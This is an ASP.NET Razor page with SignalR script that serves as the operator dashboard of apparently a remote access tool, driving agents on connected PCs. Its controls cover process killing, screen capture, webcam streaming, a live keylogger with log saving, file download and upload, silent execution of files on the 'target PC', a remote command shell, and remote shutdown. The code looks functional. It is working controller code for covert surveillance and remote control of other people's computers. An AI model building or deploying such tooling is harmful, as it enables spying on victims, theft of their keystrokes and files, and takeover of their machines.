@page
@model IndexModel
@{
    ViewData["Title"] = "Dashboard";
}

<div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
    <h1 class="h2">Dashboard</h1>
    <div class="btn-toolbar mb-2 mb-md-0">
        <span id="connection-status" class="badge bg-secondary p-2">Connecting...</span>
    </div>
</div>

<!-- Welcome Alert -->
<div class="alert alert-info" id="welcome-alert">
    Please select a PC from the sidebar to manage, or broadcast commands to all connected PCs.
</div>

<!-- Main Control Panel (hidden initially) -->
<div id="control-panel" class="d-none">
    <h3 id="selected-pc-name" class="mb-4">Selected PC: None</h3>

    <ul class="nav nav-tabs" id="myTab" role="tablist">
        <li class="nav-item" role="presentation">
            <button class="nav-link active" id="process-tab" data-bs-toggle="tab" data-bs-target="#processes" type="button" role="tab">Processes & Apps</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="media-tab" data-bs-toggle="tab" data-bs-target="#media" type="button" role="tab">Screen & Webcam</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="keylog-tab" data-bs-toggle="tab" data-bs-target="#keylog" type="button" role="tab">Keylogger</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="files-tab" data-bs-toggle="tab" data-bs-target="#files" type="button" role="tab">File Manager</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="terminal-tab" data-bs-toggle="tab" data-bs-target="#terminal" type="button" role="tab">Terminal</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link text-danger" id="power-tab" data-bs-toggle="tab" data-bs-target="#power" type="button" role="tab">Power Controls</button>
        </li>
    </ul>

    <div class="tab-content pt-4" id="myTabContent">
        <!-- Processes Tab -->
        <div class="tab-pane fade show active" id="processes" role="tabpanel">
            <div class="row">
                <div class="col-md-6 border-end">
                    <h5 class="mb-3">Background Processes</h5>
                    <button class="btn btn-primary mb-3" onclick="getProcesses()">Refresh Processes</button>
                    <div class="table-responsive" style="max-height: 400px; overflow-y: auto;">
                        <table class="table table-sm table-striped table-hover">
                            <thead class="table-dark">
                                <tr><th>ID</th><th>Name</th><th>Threads</th><th>Action</th></tr>
                            </thead>
                            <tbody id="process-table-body">
                                <tr><td colspan="4" class="text-center">Click Refresh to load</td></tr>
                            </tbody>
                        </table>
                    </div>
                </div>
                <div class="col-md-6">
                    <h5 class="mb-3">Visible Applications</h5>
                    <div class="input-group mb-3">
                        <button class="btn btn-info" onclick="getApplications()">Refresh Apps</button>
                        <button class="btn btn-secondary" onclick="openAppPicker()">Browse</button>
                        <input type="text" id="start-app-path" class="form-control" placeholder="Path to open (e.g. notepad.exe)">
                        <button class="btn btn-success" onclick="startApplication()">Start App</button>
                    </div>
                    <div class="table-responsive" style="max-height: 400px; overflow-y: auto;">
                        <table class="table table-sm table-striped table-hover">
                            <thead class="table-primary">
                                <tr><th>ID</th><th>Title</th><th>Action</th></tr>
                            </thead>
                            <tbody id="app-table-body">
                                <tr><td colspan="3" class="text-center">Click Refresh Apps to load</td></tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>

        <!-- Media Tab -->
        <div class="tab-pane fade" id="media" role="tabpanel">
            <div class="row">
                <div class="col-md-6">
                    <div class="card">
                        <div class="card-header bg-dark text-white d-flex justify-content-between">
                            <span>Screen Capture</span>
                            <button class="btn btn-sm btn-light" onclick="takeScreenshot()">Capture</button>
                        </div>
                        <div class="card-body text-center bg-light">
                            <img id="screenshot-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="img-fluid" alt="Screenshot" />
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="card">
                        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
                            <span>Webcam Stream</span>
                            <div class="d-flex align-items-center">
                                <select id="webcam-select" class="form-select form-select-sm me-2" style="max-width: 150px; font-size: 0.8rem;">
                                    <option value="">Default Camera</option>
                                </select>
                                <button class="btn btn-sm btn-success me-1" onclick="startWebcam()">Start</button>
                                <button class="btn btn-sm btn-danger" onclick="stopWebcam()">Stop</button>
                            </div>
                        </div>
                        <div class="card-body text-center bg-light">
                            <img id="webcam-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="img-fluid" alt="Webcam" />
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Keylogger Tab -->
        <div class="tab-pane fade" id="keylog" role="tabpanel">
            <div class="row">
                <!-- Keylogger -->
                <div class="col-12">
                    <div class="card">
                        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
                            <span>Live Keylogger</span>
                            <div>
                                <button class="btn btn-sm btn-info me-2" onclick="saveKeylog()">Save Log</button>
                                <button class="btn btn-sm btn-success" onclick="startKeylogger()">Start</button>
                                <button class="btn btn-sm btn-danger" onclick="stopKeylogger()">Stop</button>
                            </div>
                        </div>
                        <div class="card-body bg-dark">
                            <pre id="keylog-console" class="text-success mb-0" style="height: 300px; overflow-y: auto; font-family: 'Courier New', monospace;">> Awaiting key strokes...</pre>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- File Manager Tab -->
        <div class="tab-pane fade" id="files" role="tabpanel">
            <div class="card border-primary">
                <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">
                    <span>File Explorer</span>
                    <div>
                        <button class="btn btn-sm btn-outline-light" onclick="requestDirectoryContents('')">Drives</button>
                        <button class="btn btn-sm btn-light" onclick="navigateUp()">Up</button>
                    </div>
                </div>
                <div class="card-body">
                    <div class="input-group mb-3">
                        <span class="input-group-text">Path</span>
                        <input type="text" id="current-dir-path" class="form-control" placeholder="C:\">
                        <button class="btn btn-primary" onclick="requestDirectoryContents(document.getElementById('current-dir-path').value)">Go</button>
                    </div>
                    
                    <div class="input-group mb-3">
                        <input type="file" id="upload-file-input" class="form-control">
                        <button class="btn btn-warning" onclick="uploadFileToAgent()">Upload to Current Folder</button>
                    </div>
                    
                    <div class="table-responsive" style="max-height: 400px; overflow-y: auto;">
                        <table class="table table-sm table-hover align-middle">
                            <thead class="table-light" style="position: sticky; top: 0; z-index: 1;">
                                <tr>
                                    <th style="width: 50px">Type</th>
                                    <th>Name</th>
                                    <th style="width: 120px">Size</th>
                                    <th style="width: 100px">Action</th>
                                </tr>
                            </thead>
                            <tbody id="file-table-body">
                                <tr><td colspan="4" class="text-center text-muted">Select a PC to browse files</td></tr>
                            </tbody>
                        </table>
                    </div>
                    <div id="file-download-status" class="text-success small mt-2 fw-bold"></div>
                </div>
            </div>
        </div>

        <!-- Power Tab -->
        <div class="tab-pane fade" id="power" role="tabpanel">
            <div class="card border-danger">
                <div class="card-header bg-danger text-white">System Power & Commands</div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <p><strong>Execute command on selected PC:</strong></p>
                            <button class="btn btn-warning w-100 mb-2" onclick="powerCommand('Restart')">Restart System</button>
                            <button class="btn btn-danger w-100" onclick="powerCommand('Shutdown')">Shutdown System</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Terminal Tab -->
        <div class="tab-pane fade" id="terminal" role="tabpanel">
            <div class="card">
                <div class="card-header bg-dark text-white text-monospace">Remote Terminal Shell</div>
                <div class="card-body bg-dark text-white border-top border-secondary">
                    <pre id="terminal-output" class="mb-3" style="height: 300px; overflow-y: auto; font-family: 'Consolas', 'Courier New', monospace; white-space: pre-wrap; color: #0f0;">> Ready for commands...</pre>
                    <div class="input-group">
                        <span class="input-group-text bg-secondary text-white border-secondary">&gt;</span>
                        <input type="text" id="terminal-input" class="form-control bg-dark text-white border-secondary" placeholder="Enter command (e.g. ipconfig)" onkeypress="handleTerminalKeyPress(event)">
                        <button class="btn btn-outline-success" type="button" onclick="executeTerminalCommand()">Run</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- MODALS -->
    <!-- App Picker Modal -->
    <div class="modal fade" id="appPickerModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header bg-dark text-white">
                    <h5 class="modal-title">Select Application (Remote PC)</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body bg-light">
                    <div class="input-group mb-2">
                        <button class="btn btn-outline-secondary" onclick="requestDirectoryContents('', 'modal')">Drives</button>
                        <button class="btn btn-secondary" onclick="navigateUp('modal')">Up</button>
                        <input type="text" id="picker-path" class="form-control" readonly>
                    </div>
                    <div class="table-responsive bg-white border" style="height: 350px;">
                        <table class="table table-sm table-hover align-middle">
                            <tbody id="picker-table-body"></tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>

</div>

@section Scripts {
    <script>
        const connection = new signalR.HubConnectionBuilder()
            .withUrl("/remoteHub")
            .build();

        let currentTargetId = null;
        let connectedAgents = [];

        // START Connection
        connection.start().then(function () {
            document.getElementById("connection-status").textContent = "Connected";
            document.getElementById("connection-status").className = "badge bg-success p-2";
            connection.invoke("GetConnectedAgents").catch(err => console.error(err));
        }).catch(function (err) {
            document.getElementById("connection-status").textContent = "Connection Failed";
            document.getElementById("connection-status").className = "badge bg-danger p-2";
            return console.error(err.toString());
        });

        // Hub Listeners
        connection.on("ReceiveConnectedAgents", function(jsonArray) {
            let agents = JSON.parse(jsonArray);
            connectedAgents = agents.map(a => ({...a, lastHeartbeat: Date.now()}));
            renderAgentList();
        });
        connection.on("AgentConnected", function (connectionId, machineName) {
            console.log("Agent Connected: " + machineName);
            
            // Check if already in list to avoid duplicates
            let existing = connectedAgents.find(a => a.id === connectionId);
            if (!existing) {
                connectedAgents.push({ id: connectionId, name: machineName, lastHeartbeat: Date.now() });
            } else {
                existing.lastHeartbeat = Date.now();
            }
            renderAgentList();
        });

        connection.on("AgentDisconnected", function (connectionId, machineName) {
            console.log("Agent Disconnected: " + machineName);
            connectedAgents = connectedAgents.filter(a => a.id !== connectionId);
            if (currentTargetId === connectionId) {
                currentTargetId = null;
                document.getElementById('control-panel').classList.add('d-none');
                document.getElementById('welcome-alert').classList.remove('d-none');
            }
            renderAgentList();
        });

        connection.on("ReceiveAgentHeartbeat", function(connectionId) {
            let agent = connectedAgents.find(a => a.id === connectionId);
            if(agent) {
                agent.lastHeartbeat = Date.now();
                renderAgentList(); // Re-render to show heartbeat indication if needed
            }
        });

        connection.on("AgentStatusUpdate", function (agentId, status) {
            let agent = connectedAgents.find(a => a.id === agentId);
            if (agent) {
                agent.status = status;
                renderAgentList();
            }
        });

        // Background check for 60s timeout
        setInterval(function() {
            let now = Date.now();
            let changed = false;
            for(let i = connectedAgents.length - 1; i >= 0; i--) {
                let agent = connectedAgents[i];
                if (agent.lastHeartbeat && (now - agent.lastHeartbeat > 60000)) {
                    console.log("Agent timeout: " + agent.name);
                    connectedAgents.splice(i, 1);
                    changed = true;
                    if (currentTargetId === agent.id) {
                        currentTargetId = null;
                        document.getElementById('control-panel').classList.add('d-none');
                        document.getElementById('welcome-alert').classList.remove('d-none');
                    }
                }
            }
            if (changed) renderAgentList();
        }, 5000);

        // UI Helpers
        function renderAgentList() {
            const list = document.getElementById("pc-list");
            list.innerHTML = "";
            let now = Date.now();
            
            connectedAgents.forEach(agent => {
                const li = document.createElement("li");
                li.className = "nav-item";
                
                // Show status: Connected, Keylogging, Webcam, etc.
                let statusText = agent.status || "Connected";
                let badgeClass = statusText === "Connected" ? "bg-success" : "bg-primary";

                li.innerHTML = `<a class="nav-link ${agent.id === currentTargetId ? 'active' : ''}" href="#" onclick="selectAgent('${agent.id}', '${agent.name}')">
                    🖥️ ${agent.name} <span class="badge ${badgeClass} float-end">${statusText}</span>
                </a>`;
                list.appendChild(li);
            });
        }

        function selectAgent(id, name) {
            currentTargetId = id;
            document.getElementById('selected-pc-name').textContent = "Selected PC: " + name;
            document.getElementById('welcome-alert').classList.add('d-none');
            document.getElementById('control-panel').classList.remove('d-none');
            renderAgentList(); // To update active class
            
            // Tự động yêu cầu danh sách Webcam khi vừa chọn máy mới
            document.getElementById('webcam-select').innerHTML = '<option value="">Loading cameras...</option>';
            connection.invoke("RequestWebcams", currentTargetId).catch(err => console.error(err));

            // Load danh sách ổ đĩa mặc định
            requestDirectoryContents("");
        }

        // --- COMMANDS ---
        function getProcesses() { 
            if(!currentTargetId) return; 
            document.getElementById("process-table-body").innerHTML = '<tr><td colspan="4" class="text-center"><span class="spinner-border spinner-border-sm"></span> Loading...</td></tr>';
            connection.invoke("RequestProcesses", currentTargetId).catch(err => console.error(err));
        }
        
        connection.on("ReceiveProcesses", function(targetId, jsonArray) {
            if (targetId !== currentTargetId) return;
            const processes = JSON.parse(jsonArray);
            const tbody = document.getElementById("process-table-body");
            tbody.innerHTML = "";
            processes.forEach(p => {
                tbody.innerHTML += `<tr>
                    <td>${p.Id}</td>
                    <td>${p.Name}</td>
                    <td>${p.Threads}</td>
                    <td><button class="btn btn-sm btn-danger" onclick="killProcess(${p.Id})">Kill</button></td>
                </tr>`;
            });
        });

        function getApplications() { 
            if(!currentTargetId) return; 
            document.getElementById("app-table-body").innerHTML = '<tr><td colspan="3" class="text-center"><span class="spinner-border spinner-border-sm"></span> Loading...</td></tr>';
            connection.invoke("RequestApplications", currentTargetId).catch(err => console.error(err));
        }

        connection.on("ReceiveApplications", function(targetId, jsonArray) {
            if (targetId !== currentTargetId) return;
            const apps = JSON.parse(jsonArray);
            const tbody = document.getElementById("app-table-body");
            tbody.innerHTML = "";
            apps.forEach(a => {
                tbody.innerHTML += `<tr>
                    <td>${a.Id}</td>
                    <td><small><strong>${a.Name}</strong><br/>${a.Title}</small></td>
                    <td><button class="btn btn-sm btn-danger" onclick="killProcess(${a.Id})">Close</button></td>
                </tr>`;
            });
        });

        function killProcess(pid) {
            if(!currentTargetId) return;
            if(confirm('Are you sure you want to kill process/app ' + pid + '?')) {
                connection.invoke("KillProcess", currentTargetId, pid).catch(err => console.error(err));
                setTimeout(() => { getProcesses(); getApplications(); }, 1000); // refresh after 1s
            }
        }

        function startApplication() {
            if(!currentTargetId) return;
            let path = document.getElementById("start-app-path").value;
            if(!path) { alert("Please enter application path or name!"); return; }
            connection.invoke("StartApplication", currentTargetId, path).catch(err => console.error(err));
            setTimeout(getApplications, 1500); // refresh after 1.5s
        }

        function takeScreenshot() { 
            if(!currentTargetId) return; 
            document.getElementById("screenshot-img").src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23EEEEEE'/%3E%3Ctext x='50%25' y='50%25' fill='%23555555' font-family='Arial' font-size='10' text-anchor='middle'%3ELoading...%3C/text%3E%3C/svg%3E";
            connection.invoke("RequestScreenshot", currentTargetId).catch(err => console.error(err));
        }

        connection.on("ReceiveScreenshot", function(targetId, base64Image) {
            if (targetId !== currentTargetId) return;
            if(base64Image) {
                document.getElementById("screenshot-img").src = "data:image/jpeg;base64," + base64Image;
            }
        });

        connection.on("ReceiveWebcams", function(targetId, jsonArray) {
            if (targetId !== currentTargetId) return;
            const cameras = JSON.parse(jsonArray);
            const selectEl = document.getElementById("webcam-select");
            selectEl.innerHTML = '<option value="">Default Camera</option>';
            cameras.forEach(cam => {
                const opt = document.createElement('option');
                opt.value = cam.MonikerString;
                opt.textContent = cam.Name;
                selectEl.appendChild(opt);
            });
        });

        function startWebcam() {
            if(!currentTargetId) return; 
            const selectedCamera = document.getElementById("webcam-select").value;
            document.getElementById("webcam-img").src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23EEEEEE'/%3E%3Ctext x='50%25' y='50%25' fill='%23555555' font-family='Arial' font-size='10' text-anchor='middle'%3ELocalizing Camera...%3C/text%3E%3C/svg%3E";
            connection.invoke("RequestStartWebcam", currentTargetId, selectedCamera).catch(err => console.error(err));
        }
        
        function stopWebcam() {
            if(!currentTargetId) return; 
            connection.invoke("RequestStopWebcam", currentTargetId).catch(err => console.error(err));
        }
        
        connection.on("ReceiveWebcamFrame", function(targetId, base64Image) {
            if (targetId !== currentTargetId) return;
            if(base64Image) {
                document.getElementById("webcam-img").src = "data:image/jpeg;base64," + base64Image;
            }
        });
        function startKeylogger() {
            if(!currentTargetId) return; 
            document.getElementById("keylog-console").textContent = "> Keylogger started...\n";
            connection.invoke("RequestStartKeylogger", currentTargetId).catch(err => console.error(err));
        }

        function stopKeylogger() {
            if(!currentTargetId) return; 
            document.getElementById("keylog-console").textContent += "> Keylogger stopped.\n";
            connection.invoke("RequestStopKeylogger", currentTargetId).catch(err => console.error(err));
        }

        connection.on("ReceiveKeylog", function(targetId, keys) {
            if (targetId !== currentTargetId) return;
            const consoleEl = document.getElementById("keylog-console");
            let currentText = consoleEl.textContent;
            
            for(let i = 0; i < keys.length; i++) {
                if (keys[i] === '\b') {
                    if (currentText.length > 0) {
                        currentText = currentText.slice(0, -1);
                    }
                } else {
                    currentText += keys[i];
                }
            }
            
            consoleEl.textContent = currentText;
            consoleEl.scrollTop = consoleEl.scrollHeight; // Auto-scroll to bottom
        });

        async function saveKeylog() {
            const consoleEl = document.getElementById("keylog-console");
            const textToSave = consoleEl.textContent;
            if (!textToSave || textToSave.trim() === "> Awaiting key strokes...") {
                alert("Không có gì để lưu!");
                return;
            }

            try {
                const blob = new Blob([textToSave], { type: "text/plain;charset=utf-8" });
                const defaultName = `Keylog_${new Date().toISOString().slice(0,10).replace(/-/g,"")}.txt`;

                if (window.showSaveFilePicker) {
                    const opts = { suggestedName: defaultName };
                    const handle = await window.showSaveFilePicker(opts);
                    const writable = await handle.createWritable();
                    await writable.write(blob);
                    await writable.close();
                } else {
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = defaultName;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                }
                alert("Lưu file Keylog thành công!");
            } catch (err) {
                if (err.name !== 'AbortError') {
                    alert("Lỗi khi lưu file: " + err.message);
                }
            }
        }

        function downloadFile(filePath) {
            if(!currentTargetId) return; 
            if(!filePath) { alert("Invalid file path!"); return; }
            
            document.getElementById("file-download-status").textContent = "Requesting file: " + filePath;
            connection.invoke("RequestFileDownload", currentTargetId, filePath).catch(err => {
                document.getElementById("file-download-status").textContent = "Error: " + err;
            });
        }

        // --- NEW: FILE BROWSER JS LOGIC ---
        let currentDirectory = "";
        let pickerDirectory = "";
        let activeExplorer = "main"; // "main" or "modal"

        function openAppPicker() {
            if(!currentTargetId) { alert("Please select a PC from the sidebar first!"); return; }
            var myModal = new bootstrap.Modal(document.getElementById('appPickerModal'));
            myModal.show();
            // Load drives into the modal picker
            requestDirectoryContents("", "modal");
        }

        function selectAppForRun(path) {
            document.getElementById('start-app-path').value = path;
            const myModalEl = document.getElementById('appPickerModal');
            const modal = bootstrap.Modal.getInstance(myModalEl);
            modal.hide();
        }

        function requestDirectoryContents(path, explorer = "main") {
            if(!currentTargetId) return;
            activeExplorer = explorer;
            const targetTbody = explorer === "main" ? "file-table-body" : "picker-table-body";
            
            document.getElementById(targetTbody).innerHTML = '<tr><td colspan="4" class="text-center"><span class="spinner-border spinner-border-sm"></span> Loading folders...</td></tr>';
            connection.invoke("RequestDirectoryContents", currentTargetId, path).catch(err => console.error(err));
        }

        connection.on("ReceiveDirectoryContents", function(targetId, path, jsonStr) {
            if (targetId !== currentTargetId) return;
            const isModal = activeExplorer === "modal";
            
            if (isModal) {
                pickerDirectory = path;
                document.getElementById("picker-path").value = path;
            } else {
                currentDirectory = path;
                document.getElementById("current-dir-path").value = path;
            }
            
            const list = JSON.parse(jsonStr);
            const tbodyId = isModal ? "picker-table-body" : "file-table-body";
            const tbody = document.getElementById(tbodyId);
            tbody.innerHTML = "";
            
            if (list.length === 0) {
                tbody.innerHTML = '<tr><td colspan="4" class="text-center text-danger">Folder is empty or access denied</td></tr>';
                return;
            }

            list.forEach(item => {
                let icon = "";
                let sizeStr = "";
                let actionBtn = "";
                
                let safePath = item.Path.replace(/\\/g, '\\\\');

                if (item.Type === "Drive") {
                    icon = "💽";
                    sizeStr = formatBytes(item.Size);
                    actionBtn = `<button class="btn btn-sm btn-outline-primary" onclick="requestDirectoryContents('${safePath}', '${activeExplorer}')">Open</button>`;
                } else if (item.Type === "Folder") {
                    icon = "📁";
                    sizeStr = "";
                    actionBtn = `<button class="btn btn-sm btn-outline-primary" onclick="requestDirectoryContents('${safePath}', '${activeExplorer}')">Open</button>`;
                } else {
                    icon = "📄";
                    sizeStr = formatBytes(item.Size);
                    
                    if (isModal) {
                        // Modal view only highlights executables
                        const ext = item.Name.toLowerCase();
                        if (ext.endsWith(".exe") || ext.endsWith(".bat") || ext.endsWith(".cmd")) {
                            actionBtn = `<button class="btn btn-sm btn-success fw-bold" onclick="selectAppForRun('${safePath}')">Select</button>`;
                        } else {
                            actionBtn = `<span class="text-muted small">Not runnable</span>`;
                        }
                    } else {
                        // Main view shows Download and Run
                        actionBtn = `<button class="btn btn-sm btn-success me-1" onclick="downloadFile('${safePath}')">↓ DL</button>`;
                        const ext = item.Name.toLowerCase();
                        if (ext.endsWith(".exe") || ext.endsWith(".bat") || ext.endsWith(".cmd")) {
                            actionBtn += `<button class="btn btn-sm btn-danger" onclick="runRemoteApp('${safePath}')">▶ Run</button>`;
                        }
                    }
                }

                tbody.innerHTML += `<tr>
                    <td class="text-center fs-5" style="width: 40px">${icon}</td>
                    <td>${item.Name}</td>
                    <td class="text-muted small" style="width: 100px">${sizeStr}</td>
                    <td style="width: 120px">${actionBtn}</td>
                </tr>`;
            });
        });

        function navigateUp(explorer = "main") {
            const currentPath = explorer === "main" ? currentDirectory : pickerDirectory;
            
            if (!currentPath) {
                requestDirectoryContents("", explorer);
                return;
            }
            
            let path = currentPath;
            if (path.endsWith("\\") && path.length > 3) {
                path = path.slice(0, -1);
            }
            
            const lastSlash = path.lastIndexOf("\\");
            if (lastSlash > 0) {
                let parent = path.substring(0, lastSlash);
                if (parent.length === 2 && parent[1] === ':') parent += "\\"; 
                requestDirectoryContents(parent, explorer);
            } else {
                requestDirectoryContents("", explorer); 
            }
        }

        function formatBytes(bytes, decimals = 2) {
            if (!+bytes) return '0 Bytes';
            const k = 1024;
            const dm = decimals < 0 ? 0 : decimals;
            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
        }

        async function uploadFileToAgent() {
            if(!currentTargetId) { alert("Please select a PC first."); return; }
            if(!currentDirectory) { alert("Please open a valid target folder first (e.g. C:\\). Cannot upload directly to the Drive list."); return; }
            
            const fileInput = document.getElementById("upload-file-input");
            if(fileInput.files.length === 0) { alert("Please select a file to upload!"); return; }
            
            const file = fileInput.files[0];
            const reader = new FileReader();
            
            document.getElementById("file-download-status").textContent = `Uploading ${file.name} (${formatBytes(file.size)}). Please wait...`;
            
            reader.onload = function(e) {
                const dataUrl = e.target.result;
                const base64Data = dataUrl.substring(dataUrl.indexOf(',') + 1);
                
                connection.invoke("UploadFileToAgent", currentTargetId, currentDirectory, file.name, base64Data)
                .then(() => {
                    document.getElementById("file-download-status").textContent = `File ${file.name} uploaded successfully to ${currentDirectory}!`;
                    fileInput.value = ""; // Clear
                    setTimeout(() => requestDirectoryContents(currentDirectory), 1000); // Reload folder to show new file
                })
                .catch(err => {
                    document.getElementById("file-download-status").textContent = "Upload Error: " + err;
                });
            };
            
            reader.readAsDataURL(file);
        }

        function runRemoteApp(path) {
            if(!currentTargetId) return;
            if(confirm(`CRITICAL: Are you sure you want to silently execute this file on the target PC?\n\nFile: ${path}`)) {
                connection.invoke("StartApplication", currentTargetId, path).catch(err => console.error(err));
                document.getElementById("file-download-status").textContent = `Sent run command for: ${path}`;
            }
        }
        
        connection.on("ReceiveFile", async function(targetId, fileName, base64Data) {
            if (targetId !== currentTargetId) return;
            document.getElementById("file-download-status").textContent = "File received: " + fileName + ". Waiting for save location...";
            
            try {
                // Convert base64 to Blob
                const byteCharacters = atob(base64Data);
                const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], {type: "application/octet-stream"});

                if (window.showSaveFilePicker) {
                    // Mở hộp thoại "Save As" chuyên nghiệp (chỉ hỗ trợ trên Chrome/Edge/Opera đời mới)
                    const opts = { suggestedName: fileName };
                    const handle = await window.showSaveFilePicker(opts);
                    const writable = await handle.createWritable();
                    await writable.write(blob);
                    await writable.close();
                    document.getElementById("file-download-status").textContent = "File saved successfully!";
                } else {
                    // Cách cổ điển: Tải thẳng vào thư mục Downloads cho các trình duyệt cũ
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = fileName;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                    document.getElementById("file-download-status").textContent = "File downloaded to Downloads folder.";
                }
            } catch (err) {
                if (err.name !== 'AbortError') {
                    document.getElementById("file-download-status").textContent = "Error saving file: " + err.message;
                } else {
                    document.getElementById("file-download-status").textContent = "Save cancelled by user.";
                }
            }
            
            setTimeout(() => {
                document.getElementById("file-download-status").textContent = ""; // Clear status after 3s
            }, 3000);
        });
        
        function powerCommand(cmd) { 
            if(!currentTargetId) return; 
            if(confirm('CRITICAL WARNING: Are you sure you want to ' + cmd + ' the target machine? It will be disconnected.')) {
                if (cmd === 'Shutdown') connection.invoke("ShutdownDevice", currentTargetId).catch(err => console.error(err));
                else if (cmd === 'Restart') connection.invoke("RestartDevice", currentTargetId).catch(err => console.error(err));
            }
        }

        // --- TERMINAL ---
        function handleTerminalKeyPress(e) {
            if (e.key === 'Enter') {
                executeTerminalCommand();
            }
        }

        function executeTerminalCommand() {
            if(!currentTargetId) return;
            const inputEl = document.getElementById("terminal-input");
            const command = inputEl.value.trim();
            if(!command) return;

            const outEl = document.getElementById("terminal-output");
            outEl.textContent += `\n> ${command}\nRunning...`;
            inputEl.value = "";

            connection.invoke("RequestExecuteCommand", currentTargetId, command).catch(err => {
                outEl.textContent += `\nError: ${err}`;
            });
        }

        connection.on("ReceiveTerminalOutput", function(targetId, output) {
            if (targetId !== currentTargetId) return;
            const outEl = document.getElementById("terminal-output");
            outEl.textContent = outEl.textContent.replace("Running...", "");
            outEl.textContent += `\n${output}\n`;
            outEl.scrollTop = outEl.scrollHeight;
        });
    </script>
}
